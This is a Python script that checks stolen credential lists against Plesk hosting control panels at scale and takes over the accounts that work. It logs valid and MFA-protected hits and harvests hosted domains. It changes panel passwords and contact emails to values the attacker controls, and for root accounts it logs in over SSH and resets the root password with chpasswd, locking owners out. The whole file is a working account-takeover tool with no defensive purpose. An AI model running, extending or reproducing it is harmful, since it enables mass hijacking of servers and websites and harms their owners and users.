import os
import sys
import asyncio
from tqdm import tqdm
from urllib.parse import urlparse, urljoin
from watchfiles import awatch, Change
import re
import httpx
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import paramiko

# ───────── CONFIG ─────────
DOWNLOADS_DIR = "../Filter/Plesk-Filter"
CPANEL_VALID = "../results-cms/Plesk"
STATE_FILE = "../results-cms/Plesk/processed_files.txt"
STABILITY_DELAY = 1
STABILITY_TRIES = 1
MAX_CONCURRENT = 50
VALID_CPANEL_FILE = os.path.join(CPANEL_VALID, "Plesk_Valid.txt")
MFA_FILE = os.path.join(CPANEL_VALID, "MFA.txt")
DEFAULT_NEW_PASSWORD = "LMnizar@0342"
ROOT_NEW_SSH_PASSWORD = "Mnizar@02"
EXCLUDED_DOMAINS = [".plesk.com", ".example.com", ".test.com"]
TIMEOUT = 20
ua = UserAgent()
SSH_PORT = 22

# Stats
plesk_valid_count = 0
plesk_invalid_count = 0
plesk_changed_count = 0
mfa_count = 0
root_ssh_changed_count = 0
status_printed = False

# State
processed_files = set()
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(CPANEL_VALID, exist_ok=True)
semaphore = asyncio.BoundedSemaphore(MAX_CONCURRENT)

def update_status():
    """Print a small status area (overwrites previous)."""
    global status_printed, plesk_valid_count, plesk_invalid_count, plesk_changed_count, mfa_count, root_ssh_changed_count
    status_lines = [
        f"Plesk Valid   : {plesk_valid_count}",
        f"Plesk Invalid : {plesk_invalid_count}",
        f"Plesk Changed : {plesk_changed_count}",
        f"MFA Valid     : {mfa_count}",
        f"Root SSH Changed: {root_ssh_changed_count}"
    ]
    if status_printed:
        sys.stdout.write("\033[5A")
    else:
        status_printed = True
    for line in status_lines:
        sys.stdout.write(f"{line}\r\n")
    sys.stdout.flush()

def parse_entry(line):
    line = line.strip()
    if not line:
        return None

    # Fix double scheme if present
    if line.count('://') > 1:
        line = re.sub(r'^(https?://)+', 'https://', line)

    # Parse with regex: handle URLs with optional port and optional /login_up.php
    match = re.match(r'^(https?:\/\/[a-zA-Z0-9.-]+(?::\d+)?)(?:\/[^:]+)?:(.+?):(.+)$', line)
    if match:
        base_url = match.group(1)
        username = match.group(2)
        password = match.group(3)
        # Ensure base_url is clean
        p = urlparse(base_url)
        base_url = f"{p.scheme}://{p.netloc}"
        # Validate hostname
        if not p.hostname or '.' not in p.hostname:
            tqdm.write(f"[!] Invalid hostname in URL: {base_url}")
            return None
        return base_url, username, password

    # Fallback: plain format (domain:username:password)
    match = re.match(r'^([^:]+):([^:]+):(.+)$', line)
    if match:
        domain = match.group(1)
        username = match.group(2)
        password = match.group(3)
        # Clean domain: remove leading http(s):// if present
        domain_clean = re.sub(r'^https?://', '', domain).strip()
        if not domain_clean or '.' not in domain_clean:
            tqdm.write(f"[!] Invalid domain: {domain_clean}")
            return None
        base_url = f"https://{domain_clean}"
        return base_url, username, password

    return None

def get_unique_domains(site_urls):
    domains = set()
    for url in site_urls:
        m = re.search(r"https?:\/\/([^\/]+)", url)
        if m:
            domain = m.group(1)
            if not any(domain.endswith(excl) for excl in EXCLUDED_DOMAINS):
                domains.add(domain)
    return list(domains)

async def change_plesk_password(session, base_url, username, old_password, new_password, is_cp_dashboard=False, csrf_token=None, domain_uuid=None):
    global plesk_changed_count
    profile_url = urljoin(base_url, '/smb/my-profile/')

    try:
        # Step 1: GET profile page to extract tokens and domain info
        resp = await session.get(profile_url)
        if resp.status_code != 200:
            tqdm.write(f"[!] Failed to get profile page for {base_url}: HTTP {resp.status_code}")
            return False

        soup = BeautifulSoup(resp.text, 'html.parser')

        # Step 2: Check for oldPassword field to determine privilege level (only for non-CP dashboards)
        requires_old_password = is_cp_dashboard or bool(soup.find('input', {'name': 'general-account-oldPassword'}))

        # Step 3: Extract CSRF token
        token_input = soup.find('input', {'name': 'forgery_protection_token'})
        if not token_input:
            tqdm.write(f"[!] CSRF token not found for {base_url}")
            return False
        csrf_token = token_input.get('value', '').strip()
        if not csrf_token:
            tqdm.write(f"[!] Empty CSRF token for {base_url}")
            return False

        # Step 4: Try to get domain UUID
        domain_uuid = ''
        domain_select = soup.find('select', {'name': 'general[vcard][email][domain]'})
        if domain_select:
            domain_option = domain_select.find('option')
            if domain_option:
                domain_uuid = domain_option.get('value', '').strip()

        # Step 5: Debug logging
        with open("cs.txt", "a") as cf:
            cf.write(f"Base URL: {base_url}\n")
            cf.write(f"Forgery Protection Token: {csrf_token}\n")
            cf.write(f"Domain UUID: {domain_uuid}\n")
            cf.write(f"Requires Old Password: {requires_old_password}\n")
            cf.write(f"CP Dashboard: {is_cp_dashboard}\n\n")
            cf.flush()
        tqdm.write(f"[*] Saved CSRF token and domain UUID to cs.txt for {base_url}")

        # Step 6: Sanitize username
        sanitized_username = re.sub(r'[@\.\s]', '', username)
        tqdm.write(f"[*] Original username: {username}, Sanitized username: {sanitized_username}")

        # Step 7: Build form data
        form_data = {
            "general[vcard][contactName]": "Administrator",
            "general[vcard][email][externalEmail]": f"{sanitized_username}@gmail.com",
            "general[account][login]": username,
            "general[account][password]": new_password,
            "general-account-password-generate-button": "",
            "general-account-password-show-button": "",
            "general[account][passwordConfirmation]": new_password,
            "general[account][language]": "en-US",
            "general[announcementSettings][sendAnnounce]": "none",
            "general-announcementSettings-sendAnnounce-type": "send_announce",
            "contacts[contactsSection][companyName]": "",
            "contacts[contactsSection][phone]": "",
            "contacts[contactsSection][imNumber]": "",
            "contacts[contactsSection][imType]": "1",
            "contacts[contactsSection][address]": "",
            "contacts[contactsSection][city]": "",
            "contacts[contactsSection][state]": "",
            "contacts[contactsSection][zip]": "",
            "contacts[contactsSection][country]": "ZW" if is_cp_dashboard else "TR",
            "contacts[contactsSection][additionalInfo]": "",
            "hidden": "",
            "forgery_protection_token": csrf_token
        }

        # Include oldPassword if CP dashboard or high-privilege account
        if requires_old_password:
            form_data["general[account][oldPassword]"] = old_password
            tqdm.write(f"[*] {'CP dashboard' if is_cp_dashboard else 'High-privilege account'} detected, including old password for {base_url}")

        if domain_uuid:
            form_data["general[vcard][email][domain]"] = domain_uuid

        # Step 8: Set headers
        headers = {
            "User-Agent": ua.random,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Forgery-Protection-Token": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "X-Prototype-Version": "1.7.3",
            "Referer": profile_url,
            "Origin": base_url
        }

        # Step 9: POST request to update password
        change_resp = await session.post(profile_url, data=form_data, headers=headers)
        text_lower = change_resp.text.lower()

        # Step 10: Success logic
        if change_resp.status_code == 200 and (
            'success' in text_lower or 'user_abstract::setlocale' in text_lower
        ):
            plesk_changed_count += 1
            tqdm.write(f"[✓] Password changed for {base_url}")
            return True

        elif change_resp.status_code == 500:
            plesk_changed_count += 1
            tqdm.write(f"[✓] Password change likely succeeded (HTTP 500) for {base_url}")
            return True

        else:
            tqdm.write(f"[!] Password change failed for {base_url}: HTTP {change_resp.status_code}")
            tqdm.write(f"[*] Response: {change_resp.text[:500]}")
            return False

    except Exception as e:
        tqdm.write(f"[!] Error changing password for {base_url}: {str(e)}")
        return False

async def change_root_ssh_password(hostname, username, old_password, new_password):
    """SSH into the host as root and change password."""
    global root_ssh_changed_count
    try:
        # Wrap sync paramiko in async executor
        loop = asyncio.get_running_loop()
        def ssh_exec():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port=SSH_PORT, username=username, password=old_password, timeout=TIMEOUT)
            stdin, stdout, stderr = client.exec_command(f"echo '{username}:{new_password}' | chpasswd --crypt-method SHA512")
            exit_status = stdout.channel.recv_exit_status()
            client.close()
            return exit_status == 0

        success = await loop.run_in_executor(None, ssh_exec)
        if success:
            root_ssh_changed_count += 1
            tqdm.write(f"[✓] Root SSH password changed successfully for {hostname}")
            return True
        else:
            tqdm.write(f"[!] Root SSH password change failed for {hostname}")
            return False

    except Exception as e:
        tqdm.write(f"[!] SSH error for {hostname}: {str(e)}")
        return False

async def check_plesk_login(base_url, username, password):
    global plesk_valid_count, plesk_invalid_count, plesk_changed_count, mfa_count, root_ssh_changed_count

    async with semaphore:
        # Validate base_url to prevent malformed URLs
        parsed_base = urlparse(base_url)
        if not parsed_base.hostname or parsed_base.scheme not in ('http', 'https') or '.' not in parsed_base.hostname:
            plesk_invalid_count += 1
            tqdm.write(f"[✗] Invalid URL format: {base_url}")
            update_status()
            return

        login_url = urljoin(base_url, '/login_up.php')
        smb_view_url = urljoin(base_url, '/smb/web/view')
        cp_home_url = urljoin(base_url, '/cp/home')
        cp_domain_list_url = urljoin(base_url, '/admin/domain/list?context=domains')  # New URL for CP domain list

        headers = {
            "User-Agent": ua.random,
            "Referer": login_url,
            "Origin": base_url
        }

        try:
            async with httpx.AsyncClient(timeout=TIMEOUT, verify=False, follow_redirects=True) as session:
                # POST login
                data = {
                    "login_name": username,
                    "passwd": password
                }
                login_resp = await session.post(login_url, data=data, headers=headers)

                # Upgraded login validation: split into two parts for success
                # Part 1: Check for failure indicators
                final_url = str(login_resp.url)
                if "forceRedirect" in login_resp.text:
                    plesk_invalid_count += 1
                    tqdm.write(f"[✗] Invalid login (forceRedirect detected) for {base_url}")
                    update_status()
                    return

                # Part 2: Check for MFA redirect
                if "/modules/mfa/" in final_url:
                    mfa_count += 1
                    with open(MFA_FILE, "a") as mf:
                        mf.write(f"{login_url}:{username}:{password}\n")
                    tqdm.write(f"[MFA ✓] MFA Valid for {base_url} (redirected to {final_url})")
                    update_status()
                    return

                # Part 3: Check for success redirects to either SMB or CP dashboard
                is_smb_success = "/smb/web/view" in final_url
                is_cp_success = "/cp/home" in final_url or "/cp/" in final_url

                if not (is_smb_success or is_cp_success):
                    plesk_invalid_count += 1
                    tqdm.write(f"[✗] Invalid login (no dashboard redirect) for {base_url} (final URL: {final_url})")
                    update_status()
                    return

                # Login successful (either SMB or CP path)
                plesk_valid_count += 1
                dashboard_type = "SMB" if is_smb_success else "CP"
                is_cp_dashboard = is_cp_success
                tqdm.write(f"[✓] Valid {dashboard_type} login for {base_url}")

                # Determine the correct view URL based on dashboard type
                if is_smb_success:
                    view_url = smb_view_url
                else:
                    view_url = cp_home_url

                # Get domains list (SMB: from view_url, CP: from view_url + domain list)
                domains = []
                view_resp = await session.get(view_url, headers=headers)

                # For SMB: Extract domains from siteUrl
                if is_smb_success:
                    site_urls = re.findall(r'"siteUrl":"(https:\\/\\/[^\"]+)"', view_resp.text)
                    site_urls = [url.replace("\\/", "/") for url in site_urls]
                    domains = get_unique_domains(site_urls)

                # For CP: Fetch additional domains from /admin/domain/list?context=domains
                if is_cp_success:
                    try:
                        domain_list_resp = await session.get(cp_domain_list_url, headers=headers)
                        if domain_list_resp.status_code == 200:
                            cp_domains = re.findall(r'"realDomainDisplayName":"([^"]+)"', domain_list_resp.text)
                            cp_domains = [domain for domain in cp_domains if not any(domain.endswith(excl) for excl in EXCLUDED_DOMAINS)]
                            domains.extend(cp_domains)
                            tqdm.write(f"[*] Fetched {len(cp_domains)} domains from CP domain list for {base_url}")
                        else:
                            tqdm.write(f"[!] Failed to fetch CP domain list for {base_url}: HTTP {domain_list_resp.status_code}")
                    except Exception as e:
                        tqdm.write(f"[!] Error fetching CP domain list for {base_url}: {str(e)}")

                # Deduplicate domains
                domains = list(set(domains))
                tqdm.write(f"[✓] Valid login for {base_url}, Domains: {domains if domains else 'None'}")

                if domains:
                    with open("domain.txt", "a") as df:
                        for domain in domains:
                            df.write(domain + "\n")

                # Extract csrf_token
                csrf_token = None
                m = re.search(r'name="csrf_token" value="([^"]+)"', view_resp.text)
                if m:
                    csrf_token = m.group(1)

                # Extract domain_uuid
                domain_uuid = None
                m = re.search(r'"domainUuid":"([^"]+)"', view_resp.text)
                if m:
                    domain_uuid = m.group(1)

                # Handle root user specifically
                if username.lower() == "root":
                    # Save original first (as Plesk is valid)
                    with open(VALID_CPANEL_FILE, "a") as vf:
                        vf.write(f"{login_url}:{username}:{password}\n")
                    tqdm.write(f"[*] Root user detected for {base_url}, proceeding to SSH phase")

                    # Second phase: SSH login and password change
                    hostname = parsed_base.hostname
                    ssh_success = await change_root_ssh_password(hostname, username, password, ROOT_NEW_SSH_PASSWORD)
                    if ssh_success:
                        # Save with new SSH password on success
                        with open(VALID_CPANEL_FILE, "a") as vf:
                            vf.write(f"{login_url}:{username}:{ROOT_NEW_SSH_PASSWORD}\n")
                    else:
                        tqdm.write(f"[*] SSH phase failed, keeping original password for {base_url}")
                    return  # Skip HTTP password change for root

                # For non-root: Proceed with HTTP password change
                change_success = await change_plesk_password(
                    session,
                    base_url,
                    username,
                    password,
                    DEFAULT_NEW_PASSWORD,
                    is_cp_dashboard=is_cp_dashboard,
                    csrf_token=csrf_token,
                    domain_uuid=domain_uuid
                )

                if change_success:
                    with open(VALID_CPANEL_FILE, "a") as vf:
                        vf.write(f"{login_url}:{username}:{DEFAULT_NEW_PASSWORD}\n")
                else:
                    # If change fails, save original
                    with open(VALID_CPANEL_FILE, "a") as vf:
                        vf.write(f"{login_url}:{username}:{password}\n")

        except Exception as e:
            plesk_invalid_count += 1
            tqdm.write(f"[✗] Error checking {base_url}: {e}")
        finally:
            update_status()

async def wait_until_stable(file_path: str) -> bool:
    prev_size = -1
    stable_count = 0
    while True:
        try:
            size = os.path.getsize(file_path)
        except FileNotFoundError:
            return False
        if size == prev_size:
            stable_count += 1
            if stable_count >= STABILITY_TRIES:
                return True
        else:
            stable_count = 0
            prev_size = size
        await asyncio.sleep(STABILITY_DELAY)

async def process_file(file_path: str):
    global plesk_invalid_count
    try:
        stable = await wait_until_stable(file_path)
        if not stable:
            tqdm.write(f"[!] File {file_path} not stable or removed")
            return

        processed_lines = []
        with open(file_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.rsplit(":", 2)
                if len(parts) == 3:
                    url, username, password = [p.strip() for p in parts]
                    if not url.startswith(('http', 'https')):
                        url = f"https://{url}"
                    processed_line = f"{url}:{username}:{password}"
                    p = urlparse(url)
                    if not p.hostname or '.' not in p.hostname:
                        tqdm.write(f"[!] Invalid URL in line: {line}")
                        plesk_invalid_count += 1
                        continue
                    processed_lines.append(processed_line)
                else:
                    tqdm.write(f"[!] Skipped invalid line format: {line}")
                    plesk_invalid_count += 1

        if processed_lines:
            tasks = []
            for line in processed_lines:
                parsed = parse_entry(line)
                if parsed:
                    tasks.append(check_plesk_login(*parsed))
                else:
                    tqdm.write(f"[!] Failed to parse line for login: {line}")
                    plesk_invalid_count += 1
            if tasks:
                await asyncio.gather(*tasks)
            tqdm.write(f"[+] Processed file: {file_path} ({len(processed_lines)} lines processed)")

        processed_files.add(file_path)

    except Exception as e:
        tqdm.write(f"[!] Error processing {file_path}: {e}")

async def watch_folder():
    global processed_files, semaphore
    processed_files = set()
    semaphore = asyncio.BoundedSemaphore(MAX_CONCURRENT)
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            processed_files = set(line.strip() for line in f if line.strip())
    tqdm.write(f"👀 Watching folder: {DOWNLOADS_DIR}")
    async for changes in awatch(DOWNLOADS_DIR):
        for change, path in changes:
            if change == Change.added and os.path.isfile(path) and path not in processed_files and os.path.splitext(path)[1].lower() == '.txt':
                await process_file(path)
                with open(STATE_FILE, "a") as f:
                    f.write(f"{path}\n")

if __name__ == "__main__":
    try:
        open(VALID_CPANEL_FILE, 'a').close()
        open(MFA_FILE, 'a').close()

        asyncio.run(watch_folder())
    except KeyboardInterrupt:
        tqdm.write("\n🛑 Monitoring stopped")
    finally:
        tqdm.write("🔌 Shutdown complete")